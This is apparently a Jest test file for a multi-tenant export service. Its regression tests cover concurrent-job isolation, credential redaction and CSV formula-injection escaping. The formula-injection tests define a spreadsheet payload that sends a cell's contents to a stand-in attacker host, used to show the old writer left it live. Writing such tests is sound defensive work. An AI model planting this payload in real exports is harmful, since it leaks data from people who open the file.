// cspell:ignore brillig stringifier
import 'reflect-metadata';

/**
 * `RepositoriesService` drags the whole entity graph in through its constructor; the export service
 * only ever calls one method on it. Stubbing the module keeps this suite about the export itself.
 */
jest.mock('../repositories/repositories.service', () => ({
	RepositoriesService: class RepositoriesService {}
}));

/**
 * The real `RequestContext` reads `nestjs-cls`, i.e. an `AsyncLocalStorage`. The stub keeps exactly
 * that property — a value that follows the async chain of ONE request — because it is the whole
 * point of the test: the tenant id was always per-request, and the file paths were not.
 */
jest.mock('../../core/context', () => ({
	RequestContext: {
		currentTenantId: () => (globalThis as any).__exportSpecRequestStore?.getStore()?.tenantId ?? null,
		currentUserId: () => (globalThis as any).__exportSpecRequestStore?.getStore()?.userId ?? null
	}
}));

import { AsyncLocalStorage } from 'node:async_hooks';
import * as fs from 'node:fs';
import * as fsp from 'node:fs/promises';
import * as os from 'node:os';
import * as path from 'node:path';
import * as unzipper from 'unzipper';
import * as csv from 'csv-writer';
import * as csvParser from 'csv-parser';
import { ExportRedacted } from '../export-redact.decorator';
import { fromSpreadsheetSafeCsvRow } from '../spreadsheet-safe-row';
import { EXPORT_MANIFEST_FILE, usesSpreadsheetSafeCells } from '../export-manifest';
import { ExportService, IExportJob } from './export.service';

const requestStore = new AsyncLocalStorage<{ tenantId: string }>();
(globalThis as any).__exportSpecRequestStore = requestStore;

const TENANT_A = 'a0000000-0000-4000-8000-00000000000a';
const TENANT_B = 'b0000000-0000-4000-8000-00000000000b';

/** Setting names the JSON path already treats as non-secret; mirrored by the entity's predicate. */
const NON_SECRET_NAMES = ['isEnabled', 'zone'];

/**
 * A stand-in for `IntegrationSetting`: one credential column guarded by a per-row predicate, one
 * ordinary column, and a property a subscriber attaches on load.
 */
class IntegrationSettingFixture {
	id: string;
	tenantId: string;
	settingsName: string;

	@ExportRedacted<IntegrationSettingFixture>({ when: (it) => !NON_SECRET_NAMES.includes(it.settingsName) })
	settingsValue: string;

	/** Not a persisted column — attached by the entity subscriber after load. */
	wrapSecretValue?: string;
}

const SETTING_COLUMNS = ['id', 'tenantId', 'settingsName', 'settingsValue'];

/** The rows each tenant owns, keyed by tenant id. */
const ROWS: Record<string, IntegrationSettingFixture[]> = {
	[TENANT_A]: [
		Object.assign(new IntegrationSettingFixture(), {
			id: 'row-a-token',
			tenantId: TENANT_A,
			settingsName: 'access_token',
			settingsValue: 'tenant-a-secret-access-token-0123456789',
			wrapSecretValue: 'subscriber-added'
		}),
		Object.assign(new IntegrationSettingFixture(), {
			id: 'row-a-flag',
			tenantId: TENANT_A,
			settingsName: 'isEnabled',
			settingsValue: 'true',
			wrapSecretValue: 'true'
		})
	],
	[TENANT_B]: [
		Object.assign(new IntegrationSettingFixture(), {
			id: 'row-b-token',
			tenantId: TENANT_B,
			settingsName: 'refresh_token',
			settingsValue: 'tenant-b-secret-refresh-token-9876543210',
			wrapSecretValue: 'subscriber-added'
		})
	]
};

/** Lets the two concurrent exports actually interleave on the event loop. */
const tick = () => new Promise((resolve) => setTimeout(resolve, 5));

/**
 * A repository just rich enough for `ExportService.getAsCsv`, returning rows for whichever tenant
 * the caller asked about and yielding to the event loop first, exactly as a real query would.
 */
function buildRepositoryGraph() {
	const repository: any = {
		metadata: {
			tableName: 'integration_setting',
			givenTableName: 'integration_setting',
			target: IntegrationSettingFixture,
			columns: SETTING_COLUMNS.map((name) => ({ propertyName: name, databaseName: name })),
			ownColumns: SETTING_COLUMNS.map((name) => ({ propertyName: name, databaseName: name })),
			manyToManyRelations: []
		},
		findAndCount: async (options: any) => {
			await tick();
			const tenantId = options?.where?.tenantId;
			// The "global default rows" probe passes an IsNull() operator, not a string.
			if (typeof tenantId !== 'string') {
				return [[], 0];
			}
			const rows = ROWS[tenantId] ?? [];
			return [rows, rows.length];
		}
	};

	return [{ repository, isCheckRelation: false, relations: [], isTenantBased: true }];
}

function buildService(): ExportService {
	const repositoriesService: any = {
		buildRepositoriesRelationsGraph: jest.fn(async () => buildRepositoryGraph())
	};
	return new ExportService(repositoriesService);
}

/** Reads one file out of a finished archive. */
async function readFromArchive(archivePath: string, fileName: string): Promise<string> {
	const directory = await unzipper.Open.file(archivePath);
	const entry = directory.files.find((file: any) => file.path === fileName);
	if (!entry) {
		throw new Error(`${fileName} is not in ${archivePath} (has: ${directory.files.map((f: any) => f.path)})`);
	}
	return (await entry.buffer()).toString('utf8');
}

/**
 * Scratch directories created by this suite, removed after each test. A job is registered here the
 * moment it exists, so a test whose export throws half-way still leaves nothing in `os.tmpdir()`.
 */
const createdJobs: IExportJob[] = [];

/** One whole `/export` request, the way the controller drives it. */
async function runExport(service: ExportService, tenantId: string): Promise<{ job: IExportJob; archive: string }> {
	return requestStore.run({ tenantId }, async () => {
		const job = await service.createExportJob();
		createdJobs.push(job);
		await service.exportTables(job, undefined);
		await service.archiveAndDownload(job);
		return { job, archive: await readFromArchive(job.archivePath, 'integration_setting.csv') };
	});
}

describe('ExportService', () => {
	let service: ExportService;
	const jobs: IExportJob[] = [];

	beforeEach(() => {
		service = buildService();
		jobs.length = 0;
	});

	afterEach(async () => {
		for (const job of [...jobs, ...createdJobs.splice(0)]) {
			await fsp.rm(job.workDir, { recursive: true, force: true }).catch(() => undefined);
		}
	});

	describe('per-request job state (GHSA-g235-c4fm-4fc7)', () => {
		it('gives every export its own scratch directory, outside the statically served tree', async () => {
			const [first, second] = await Promise.all([service.createExportJob(), service.createExportJob()]);
			jobs.push(first, second);

			expect(first.workDir).not.toBe(second.workDir);
			expect(first.csvDir).not.toBe(second.csvDir);
			expect(first.archivePath).not.toBe(second.archivePath);

			// The old scratch root was `<assetPublicPath>/export`, mounted unauthenticated at /public.
			for (const job of [first, second]) {
				expect(job.workDir.startsWith(os.tmpdir())).toBe(true);
				expect(fs.existsSync(job.csvDir)).toBe(true);
			}
		});

		it('creates the scratch directories owner-only (0700)', async () => {
			const job = await service.createExportJob();
			jobs.push(job);

			if (process.platform === 'win32') {
				// POSIX permission bits are not meaningful on Windows; the ACL of %TEMP% applies instead.
				return;
			}
			expect((await fsp.stat(job.workDir)).mode & 0o777).toBe(0o700);
			expect((await fsp.stat(job.csvDir)).mode & 0o777).toBe(0o700);
		});

		it('removes the scratch root when job setup fails after it was created', async () => {
			const before = new Set(fs.readdirSync(os.tmpdir()).filter((name) => name.startsWith('gauzy-export-')));
			const mkdirSpy = jest.spyOn(fsp, 'mkdir').mockRejectedValueOnce(new Error('ENOSPC'));

			try {
				await expect(service.createExportJob()).rejects.toThrow('ENOSPC');
			} finally {
				mkdirSpy.mockRestore();
			}

			// The caller never got a job handle, so nothing else could have removed the directory.
			const leaked = fs
				.readdirSync(os.tmpdir())
				.filter((name) => name.startsWith('gauzy-export-') && !before.has(name));
			expect(leaked).toEqual([]);
		});

		it('does not let two concurrent exports cross archives', async () => {
			const [a, b] = await Promise.all([runExport(service, TENANT_A), runExport(service, TENANT_B)]);
			jobs.push(a.job, b.job);

			// Each tenant's archive holds that tenant's rows and NOTHING of the other's. With the
			// shared `idCsv`/`idZip` subjects, the second request's `createFolders()` moved the
			// directory out from under the first, which then archived its neighbour's CSVs.
			expect(a.archive).toContain('row-a-token');
			expect(a.archive).toContain('row-a-flag');
			expect(a.archive).not.toContain('row-b-token');
			expect(a.archive).not.toContain(TENANT_B);

			expect(b.archive).toContain('row-b-token');
			expect(b.archive).not.toContain('row-a-token');
			expect(b.archive).not.toContain(TENANT_A);
		});

		it('cleans one job up without touching another that is still running', async () => {
			const [first, second] = await Promise.all([service.createExportJob(), service.createExportJob()]);
			jobs.push(second);

			await fsp.writeFile(path.join(second.csvDir, 'user.csv'), 'id\n1\n');
			await service.cleanup(first);

			expect(fs.existsSync(first.workDir)).toBe(false);
			expect(fs.existsSync(path.join(second.csvDir, 'user.csv'))).toBe(true);
		});

		it('removes the archive and every CSV on cleanup, and is safe to call twice', async () => {
			const { job } = await runExport(service, TENANT_A);

			expect(fs.existsSync(job.archivePath)).toBe(true);
			expect(fs.readdirSync(job.csvDir)).toContain('integration_setting.csv');

			await service.cleanup(job);
			await service.cleanup(job);

			expect(fs.existsSync(job.workDir)).toBe(false);
		});
	});

	describe('secret redaction (GHSA-j5h5-r956-rxc3)', () => {
		it('masks a redacted column in the CSV while leaving an ordinary one intact', async () => {
			const { job, archive } = await runExport(service, TENANT_A);
			jobs.push(job);

			// Every field is quoted since GHSA-7xp5-j564-4752 (see `csvWriter`), so the cell text is read
			// back through the quotes here.
			const unquote = (field: string) => field.replace(/^"|"$/g, '').replace(/""/g, '"');
			const [header, ...rows] = archive.trim().split(/\r?\n/);
			const tokenRow = rows.find((row) => unquote(row).startsWith('row-a-token'));
			const flagRow = rows.find((row) => unquote(row).startsWith('row-a-flag'));

			// The credential is gone …
			expect(archive).not.toContain('tenant-a-secret-access-token-0123456789');
			expect(archive).not.toContain('secret-access-token');
			expect(tokenRow).toContain('*'.repeat(35));

			// … but the column is still there, and the non-secret columns are untouched.
			expect(header.split(',').map(unquote)).toEqual(SETTING_COLUMNS);
			expect(tokenRow).toContain('access_token');
			expect(flagRow).toContain('isEnabled');
			expect(flagRow).toContain('true');
		});

		it('keeps subscriber-attached properties out of the archive entirely', async () => {
			const { job, archive } = await runExport(service, TENANT_A);
			jobs.push(job);

			// `wrapSecretValue` is not a persisted column; it exists only because the entity
			// subscriber attaches it on load, and it must not become a CSV column.
			expect(archive.split(/\r?\n/)[0]).not.toContain('wrapSecretValue');
			expect(archive).not.toContain('subscriber-added');
		});

		it('refuses to write junction rows that carry more than the junction foreign keys', () => {
			// Junction rows are raw SQL and bypass redaction; that is only safe while they are FK pairs.
			const junction = {
				columns: [
					{ databaseName: 'tagId', referencedColumn: {} },
					{ databaseName: 'userId', referencedColumn: {} }
				]
			} as any;

			expect(() =>
				service.assertJunctionRowsOnly(junction, 'tag_user', [{ tagId: 't1', userId: 'u1' }])
			).not.toThrow();
			expect(() =>
				service.assertJunctionRowsOnly(junction, 'tag_user', [{ tagId: 't1', userId: 'u1', apiKey: 'k' }])
			).toThrow(TypeError);
			// Without junction metadata nothing is known to be safe.
			expect(() => service.assertJunctionRowsOnly(undefined, 'tag_user', [{ tagId: 't1' }])).toThrow(TypeError);
		});

		it('does not write a junction CSV when the rows fail that check', async () => {
			const job = await service.createExportJob();
			jobs.push(job);

			const joinColumn = {
				entityMetadata: { givenTableName: 'tag_user' },
				propertyName: 'userId',
				referencedColumn: { propertyName: 'id' }
			};
			const repository: any = {
				metadata: {
					givenTableName: 'user',
					manyToManyRelations: [
						{
							joinTableName: 'tag_user',
							joinColumns: [joinColumn],
							junctionEntityMetadata: {
								columns: [
									{ databaseName: 'tagId', referencedColumn: {} },
									{ databaseName: 'userId', referencedColumn: {} }
								]
							}
						}
					]
				},
				manager: { query: jest.fn(async () => [{ tagId: 't1', userId: 'u1', password: 'hunter2' }]) }
			};

			await expect(
				service.exportRelationalTables(
					job,
					{ repository, relations: [{ joinTableName: 'tag_user' }], isTenantBased: true } as any,
					{ tenantId: TENANT_A }
				)
			).rejects.toThrow(TypeError);
			expect(fs.existsSync(path.join(job.csvDir, 'tag_user.csv'))).toBe(false);
		});

		it('refuses to write a table whose entity class cannot be resolved', async () => {
			// Fail closed: an unknown entity means unknown secrets. Writing it "just in case" is how
			// the cleartext got out in the first place.
			const job = await service.createExportJob();
			jobs.push(job);

			const repository: any = {
				metadata: {
					tableName: 'mystery',
					target: undefined,
					columns: [{ propertyName: 'secret', databaseName: 'secret' }],
					manyToManyRelations: []
				},
				findAndCount: async () => [[{ secret: 'hunter2' }], 1]
			};

			await expect(
				requestStore.run({ tenantId: TENANT_A }, () =>
					service.getAsCsv(job, { repository, isCheckRelation: false, relations: [] } as any, {
						tenantId: TENANT_A
					})
				)
			).rejects.toThrow(TypeError);

			expect(fs.existsSync(path.join(job.csvDir, 'mystery.csv'))).toBe(false);
		});
	});
	describe('spreadsheet formula injection (GHSA-7xp5-j564-4752)', () => {
		const PAYLOAD = '=HYPERLINK("http://attacker/?"&A2,"x")';

		/** The pre-fix writer: plain `csv-writer` defaults, values written as they were stored. */
		async function writeUnescaped(job: IExportJob, filename: string, items: Record<string, unknown>[]) {
			const writer = csv.createObjectCsvWriter({
				path: path.join(job.csvDir, `${filename}.csv`),
				header: Object.keys(items[0]).map((key) => ({ id: key, title: key }))
			});
			await writer.writeRecords(items);
		}

		/** Reads a CSV back the way `ImportService` does for a marked archive. */
		function parse(csvPath: string, unescape = true): Promise<Record<string, string>[]> {
			return new Promise((resolve, reject) => {
				const rows: Record<string, string>[] = [];
				fs.createReadStream(csvPath, 'utf8')
					.pipe(csvParser())
					.on('data', (row: Record<string, string>) =>
						rows.push(unescape ? fromSpreadsheetSafeCsvRow(row) : row)
					)
					.on('error', reject)
					.on('end', () => resolve(rows));
			});
		}

		it('writes a stored formula as text, while an ordinary value and a number are untouched', async () => {
			const job = await service.createExportJob();
			jobs.push(job);

			const row = { id: 'row-1', name: PAYLOAD, owner: 'Ada Lovelace', rate: '-12.50' };

			// CONTROL: the pre-fix writer put the payload into the cell verbatim, so the spreadsheet
			// evaluates it on open.
			await writeUnescaped(job, 'tag_before', [row]);
			const [before] = await parse(path.join(job.csvDir, 'tag_before.csv'), false);
			expect(before.name).toBe(PAYLOAD);
			expect(before.name.startsWith('=')).toBe(true);

			await service.csvWriter(job, 'tag', [row]);
			const [after] = await parse(path.join(job.csvDir, 'tag.csv'), false);
			expect(after.name).toBe(`'${PAYLOAD}`);
			expect(after.owner).toBe('Ada Lovelace');
			// A numeric string stays a number for the reader.
			expect(after.rate).toBe('-12.50');
		});

		it('escapes an array column, which `csv-writer` turns into cell text', async () => {
			const job = await service.createExportJob();
			jobs.push(job);

			const row = { id: 'row-1', tags: ['=1+1', 'b'] };

			// CONTROL: `String(['=1+1','b'])` is `=1+1,b`, a formula in the first cell.
			await writeUnescaped(job, 'view_before', [row]);
			const [before] = await parse(path.join(job.csvDir, 'view_before.csv'), false);
			expect(before.tags).toBe('=1+1,b');

			await service.csvWriter(job, 'view', [row]);
			const [after] = await parse(path.join(job.csvDir, 'view.csv'), false);
			expect(after.tags).toBe("'=1+1,b");
		});

		it('quotes every field, so a bare CR cannot start a new spreadsheet row', async () => {
			const job = await service.createExportJob();
			jobs.push(job);

			// No comma, no newline and no quote in the value, so `csv-writer`'s default stringifier has
			// no reason of its own to quote the field.
			const row = { id: 'row-1', note: 'Acme\r=1+1' };

			// CONTROL: no comma, no newline, no quote in front of the CR, so the pre-fix writer left the
			// field bare and Excel/LibreOffice read the CR as a row break — a formula cell of its own.
			await writeUnescaped(job, 'note_before', [row]);
			const before = fs.readFileSync(path.join(job.csvDir, 'note_before.csv'), 'utf8');
			expect(before).toContain(',Acme\r=1+1');

			await service.csvWriter(job, 'note', [row]);
			const after = fs.readFileSync(path.join(job.csvDir, 'note.csv'), 'utf8');
			expect(after).toContain('"Acme\r=1+1"');
			expect(after).not.toContain(',Acme\r');
		});

		it('round-trips export → import byte for byte', async () => {
			const job = await service.createExportJob();
			jobs.push(job);

			const row = {
				id: 'row-1',
				formula: '=1+1',
				plus: '+1+1',
				minus: '-1+1',
				at: '@SUM(A1)',
				tab: '\t=1+1',
				fullWidth: '\uFF1D1+1',
				quoted: "'Twas brillig",
				numeric: '-12.50',
				plain: 'Ada Lovelace',
				comma: 'a,b',
				quote: 'say "hi"'
			};

			await service.csvWriter(job, 'round_trip', [row]);
			const [parsed] = await parse(path.join(job.csvDir, 'round_trip.csv'));

			expect(parsed).toEqual(row);
		});

		it('marks a data archive as escaped and leaves the import template unmarked', async () => {
			const { job } = await runExport(service, TENANT_A);

			const manifest = JSON.parse(await readFromArchive(job.archivePath, EXPORT_MANIFEST_FILE));
			expect(manifest).toMatchObject({
				format: 'gauzy-export',
				version: 1,
				spreadsheetSafeCells: true
			});
			// This marker is the ONLY thing that tells the importer it may reverse the escape.
			expect(await usesSpreadsheetSafeCells(job.csvDir)).toBe(true);

			// CONTROL: `/export/template` writes header-only CSVs an operator fills in by hand, so
			// nothing in it was ever escaped and the importer must not decode it.
			const templateJob = await service.createExportJob();
			jobs.push(templateJob);
			await service.exportSpecificTablesSchema(templateJob);
			expect(fs.existsSync(path.join(templateJob.csvDir, 'integration_setting.csv'))).toBe(true);
			expect(await usesSpreadsheetSafeCells(templateJob.csvDir)).toBe(false);
		});
	});
});
